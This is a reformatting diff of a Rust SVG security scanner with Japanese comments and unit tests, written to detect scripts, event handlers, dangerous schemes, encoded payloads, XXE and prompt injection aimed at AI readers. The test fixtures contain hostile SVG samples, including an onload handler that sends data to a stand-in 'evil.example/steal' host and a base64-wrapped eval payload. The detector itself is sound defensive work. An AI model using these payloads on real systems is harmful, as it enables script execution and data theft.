@@ -109,7 +109,10 @@ pub fn looks_like_svg(content: &str) -> bool {
     const SCAN_BYTES: usize = 8 * 1024;
     let end = if content.len() > SCAN_BYTES {
         // UTF-8 境界で安全に切る
-        (0..=SCAN_BYTES).rev().find(|&i| content.is_char_boundary(i)).unwrap_or(0)
+        (0..=SCAN_BYTES)
+            .rev()
+            .find(|&i| content.is_char_boundary(i))
+            .unwrap_or(0)
     } else {
         content.len()
     };
@@ -145,15 +148,25 @@ pub fn scan_svg(content: &str) -> SvgScan {
     // 2. イベントハンドラ属性
     //    <script> を使わずに実行できるため、SVG では特に重要。
     const EVENT_HANDLERS: &[&str] = &[
-        "onload", "onerror", "onclick", "onmouseover", "onfocus",
-        "onanimationstart", "onbegin", "onend", "onrepeat", "onactivate",
+        "onload",
+        "onerror",
+        "onclick",
+        "onmouseover",
+        "onfocus",
+        "onanimationstart",
+        "onbegin",
+        "onend",
+        "onrepeat",
+        "onactivate",
     ];
     for handler in EVENT_HANDLERS {
         // `onload=` / `onload =` の両方に対応
         if let Some(pos) = lower.find(handler) {
             let rest = lower[pos + handler.len()..].trim_start();
             if rest.starts_with('=') {
-                risks.push(SvgRisk::EventHandler { handler: (*handler).to_string() });
+                risks.push(SvgRisk::EventHandler {
+                    handler: (*handler).to_string(),
+                });
             }
         }
     }
@@ -161,7 +174,9 @@ pub fn scan_svg(content: &str) -> SvgScan {
     // 3. 実行可能スキーム
     for scheme in ["javascript:", "vbscript:", "data:text/html"] {
         if lower.contains(scheme) {
-            risks.push(SvgRisk::DangerousScheme { scheme: scheme.to_string() });
+            risks.push(SvgRisk::DangerousScheme {
+                scheme: scheme.to_string(),
+            });
         }
     }
 
@@ -171,7 +186,12 @@ pub fn scan_svg(content: &str) -> SvgScan {
     }
 
     // 5. 外部リソース参照 (トラッキング/追加ペイロード)
-    for marker in ["xlink:href=\"http", "href=\"http", "xlink:href='http", "href='http"] {
+    for marker in [
+        "xlink:href=\"http",
+        "href=\"http",
+        "xlink:href='http",
+        "href='http",
+    ] {
         if let Some(pos) = lower.find(marker) {
             let snippet: String = lower[pos..].chars().take(80).collect();
             risks.push(SvgRisk::ExternalReference { target: snippet });
@@ -234,7 +254,10 @@ pub fn scan_svg(content: &str) -> SvgScan {
         )
     });
 
-    SvgScan { risks, safe_as_attachment: !has_execution_risk }
+    SvgScan {
+        risks,
+        safe_as_attachment: !has_execution_risk,
+    }
 }
 
 /// SVG から「AI が読み得るテキスト」を抽出する。
@@ -261,14 +284,17 @@ fn extract_ai_visible_text(content: &str) -> Vec<String> {
         while let Some(rel) = lower[search_from..].find(&open) {
             let tag_start = search_from + rel;
             // 開始タグの終端 `>` を探す
-            let Some(gt_rel) = lower[tag_start..].find('>') else { break };
+            let Some(gt_rel) = lower[tag_start..].find('>') else {
+                break;
+            };
             let body_start = tag_start + gt_rel + 1;
             let Some(close_rel) = lower[body_start..].find(&close) else {
                 search_from = body_start;
                 continue;
             };
             let body_end = body_start + close_rel;
-            if body_start <= body_end && content.is_char_boundary(body_start)
+            if body_start <= body_end
+                && content.is_char_boundary(body_start)
                 && content.is_char_boundary(body_end)
             {
                 out.push(content[body_start..body_end].to_string());
@@ -306,7 +332,9 @@ fn extract_ai_visible_text(content: &str) -> Vec<String> {
 fn extract_script_type(script_tag_onward: &str) -> Option<String> {
     let type_pos = script_tag_onward.find("type")?;
     // タグの終端を越えていたら type 属性ではない
-    let tag_end = script_tag_onward.find('>').unwrap_or(script_tag_onward.len());
+    let tag_end = script_tag_onward
+        .find('>')
+        .unwrap_or(script_tag_onward.len());
     if type_pos > tag_end {
         return None;
     }
@@ -318,7 +346,9 @@ fn extract_script_type(script_tag_onward: &str) -> Option<String> {
     };
     let end = match quote {
         Some(q) => body.find(q)?,
-        None => body.find(|c: char| c.is_whitespace() || c == '>').unwrap_or(body.len()),
+        None => body
+            .find(|c: char| c.is_whitespace() || c == '>')
+            .unwrap_or(body.len()),
     };
     Some(body[..end].to_string())
 }
@@ -336,7 +366,11 @@ mod tests {
     fn plain_svg_is_safe() {
         let svg = r#"<svg xmlns="http://www.w3.org/2000/svg"><circle cx="5" cy="5" r="4"/></svg>"#;
         let scan = scan_svg(svg);
-        assert!(scan.safe_as_attachment, "無害な SVG が危険判定された: {:?}", scan.risks);
+        assert!(
+            scan.safe_as_attachment,
+            "無害な SVG が危険判定された: {:?}",
+            scan.risks
+        );
     }
 
     #[test]
@@ -344,7 +378,10 @@ mod tests {
         let svg = r#"<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>"#;
         let scan = scan_svg(svg);
         assert!(!scan.safe_as_attachment);
-        assert!(scan.risks.iter().any(|r| matches!(r, SvgRisk::ScriptElement { .. })));
+        assert!(scan
+            .risks
+            .iter()
+            .any(|r| matches!(r, SvgRisk::ScriptElement { .. })));
     }
 
     #[test]
@@ -352,7 +389,10 @@ mod tests {
         // 2026 年の回避手法: text/javascript ではなく application/ecmascript を使う
         let svg = r#"<svg><script type="application/ecmascript">fetch('//evil')</script></svg>"#;
         let scan = scan_svg(svg);
-        assert!(!scan.safe_as_attachment, "非推奨 MIME 型のスクリプトがすり抜けた");
+        assert!(
+            !scan.safe_as_attachment,
+            "非推奨 MIME 型のスクリプトがすり抜けた"
+        );
         let found_type = scan.risks.iter().find_map(|r| match r {
             SvgRisk::ScriptElement { script_type } => script_type.clone(),
             _ => None,
@@ -370,7 +410,10 @@ mod tests {
         let svg = r#"<svg onload="fetch('https://evil.example/steal')"><rect/></svg>"#;
         let scan = scan_svg(svg);
         assert!(!scan.safe_as_attachment, "onload ハンドラがすり抜けた");
-        assert!(scan.risks.iter().any(|r| matches!(r, SvgRisk::EventHandler { .. })));
+        assert!(scan
+            .risks
+            .iter()
+            .any(|r| matches!(r, SvgRisk::EventHandler { .. })));
     }
 
     #[test]
@@ -378,15 +421,24 @@ mod tests {
         let svg = r#"<svg><a xlink:href="javascript:alert(1)"><text>click</text></a></svg>"#;
         let scan = scan_svg(svg);
         assert!(!scan.safe_as_attachment);
-        assert!(scan.risks.iter().any(|r| matches!(r, SvgRisk::DangerousScheme { .. })));
+        assert!(scan
+            .risks
+            .iter()
+            .any(|r| matches!(r, SvgRisk::DangerousScheme { .. })));
     }
 
     #[test]
     fn foreign_object_detected() {
         let svg = r#"<svg><foreignObject><body xmlns="http://www.w3.org/1999/xhtml">x</body></foreignObject></svg>"#;
         let scan = scan_svg(svg);
-        assert!(!scan.safe_as_attachment, "foreignObject による HTML 埋め込みがすり抜けた");
-        assert!(scan.risks.iter().any(|r| matches!(r, SvgRisk::ForeignObject)));
+        assert!(
+            !scan.safe_as_attachment,
+            "foreignObject による HTML 埋め込みがすり抜けた"
+        );
+        assert!(scan
+            .risks
+            .iter()
+            .any(|r| matches!(r, SvgRisk::ForeignObject)));
     }
 
     #[test]
@@ -394,7 +446,10 @@ mod tests {
         // 多層エンコード (EML → SVG → base64 iframe) の内側
         let svg = r#"<svg><script>eval(atob('ZmV0Y2goJy8vZXZpbCcp'))</script></svg>"#;
         let scan = scan_svg(svg);
-        assert!(scan.risks.iter().any(|r| matches!(r, SvgRisk::EmbeddedEncodedPayload)));
+        assert!(scan
+            .risks
+            .iter()
+            .any(|r| matches!(r, SvgRisk::EmbeddedEncodedPayload)));
     }
 
     #[test]
@@ -402,8 +457,14 @@ mod tests {
         // 外部参照のみなら実行リスクではない (トラッキング懸念として記録)
         let svg = r#"<svg><image href="https://tracker.example/p.png"/></svg>"#;
         let scan = scan_svg(svg);
-        assert!(scan.risks.iter().any(|r| matches!(r, SvgRisk::ExternalReference { .. })));
-        assert!(scan.safe_as_attachment, "外部参照だけでは実行リスクとしない");
+        assert!(scan
+            .risks
+            .iter()
+            .any(|r| matches!(r, SvgRisk::ExternalReference { .. })));
+        assert!(
+            scan.safe_as_attachment,
+            "外部参照だけでは実行リスクとしない"
+        );
     }
 
     // ── マルチモーダル・プロンプト注入 (arxiv 2603.03637) ────────────────
@@ -416,10 +477,16 @@ mod tests {
 <circle cx="5" cy="5" r="4"/></svg>"#;
         let scan = scan_svg(svg);
         assert!(
-            scan.risks.iter().any(|r| matches!(r, SvgRisk::PromptInjectionAttempt { .. })),
-            "<desc> のプロンプト注入が検出されなかった: {:?}", scan.risks
+            scan.risks
+                .iter()
+                .any(|r| matches!(r, SvgRisk::PromptInjectionAttempt { .. })),
+            "<desc> のプロンプト注入が検出されなかった: {:?}",
+            scan.risks
         );
-        assert!(!scan.safe_as_attachment, "注入を含む SVG は添付として安全ではない");
+        assert!(
+            !scan.safe_as_attachment,
+            "注入を含む SVG は添付として安全ではない"
+        );
     }
 
     #[test]
@@ -430,8 +497,11 @@ mod tests {
 <rect width="10" height="10"/></svg>"#;
         let scan = scan_svg(svg);
         assert!(
-            scan.risks.iter().any(|r| matches!(r, SvgRisk::PromptInjectionAttempt { .. })),
-            "XML コメントに隠された注入が検出されなかった: {:?}", scan.risks
+            scan.risks
+                .iter()
+                .any(|r| matches!(r, SvgRisk::PromptInjectionAttempt { .. })),
+            "XML コメントに隠された注入が検出されなかった: {:?}",
+            scan.risks
         );
     }
 
@@ -443,8 +513,11 @@ mod tests {
 </svg>"#;
         let scan = scan_svg(svg);
         assert!(
-            scan.risks.iter().any(|r| matches!(r, SvgRisk::PromptInjectionAttempt { .. })),
-            "CDATA 内の注入が検出されなかった: {:?}", scan.risks
+            scan.risks
+                .iter()
+                .any(|r| matches!(r, SvgRisk::PromptInjectionAttempt { .. })),
+            "CDATA 内の注入が検出されなかった: {:?}",
+            scan.risks
         );
     }
 
@@ -456,8 +529,11 @@ mod tests {
 <svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>"#;
         let scan = scan_svg(svg);
         assert!(
-            scan.risks.iter().any(|r| matches!(r, SvgRisk::XmlExternalEntity)),
-            "XML 外部実体宣言が検出されなかった: {:?}", scan.risks
+            scan.risks
+                .iter()
+                .any(|r| matches!(r, SvgRisk::XmlExternalEntity)),
+            "XML 外部実体宣言が検出されなかった: {:?}",
+            scan.risks
         );
         assert!(!scan.safe_as_attachment);
     }
@@ -471,10 +547,18 @@ mod tests {
 <text x="10" y="20">合計 120,000 円</text></svg>"#;
         let scan = scan_svg(svg);
         assert!(
-            !scan.risks.iter().any(|r| matches!(r, SvgRisk::PromptInjectionAttempt { .. })),
-            "通常の日本語テキストを注入と誤検出した: {:?}", scan.risks
+            !scan
+                .risks
+                .iter()
+                .any(|r| matches!(r, SvgRisk::PromptInjectionAttempt { .. })),
+            "通常の日本語テキストを注入と誤検出した: {:?}",
+            scan.risks
         );
-        assert!(scan.safe_as_attachment, "無害な SVG が危険判定された: {:?}", scan.risks);
+        assert!(
+            scan.safe_as_attachment,
+            "無害な SVG が危険判定された: {:?}",
+            scan.risks
+        );
     }
 
     #[test]
